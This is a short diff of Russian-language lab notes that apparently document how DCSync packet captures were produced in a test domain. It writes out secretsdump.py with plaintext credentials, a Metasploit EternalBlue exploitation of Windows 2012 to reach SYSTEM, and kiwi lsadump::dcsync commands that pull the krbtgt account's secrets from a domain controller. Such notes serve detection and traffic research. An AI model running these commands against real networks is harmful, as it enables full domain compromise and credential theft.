@@ -10,3 +10,12 @@ Replicating Directory Changes All - дополнительно позволяе�
 
 Kali linux:
 secretsdump.py work.local/svc_replicator:P@ssw0rd@192.168.0.10
+
+
+Сценарий для Kiwi (dcsync_rpc_success.pcapng, dcsync_rpc_fail.pcapng - при полученом system):
+При получении подобных дампов был следующий сценарий:
+1) С Kali атаковал Windows 2012, используя metasploit модуль eternalblue с payload meterpreter (получили system)
+2) Далее в оболочке сделал load kiwi.
+3) Для успешного Dcsync: kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC02.work.local exit"
+4) Для неуспешного Dcsync: kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:192.168.0.100 exit"
+
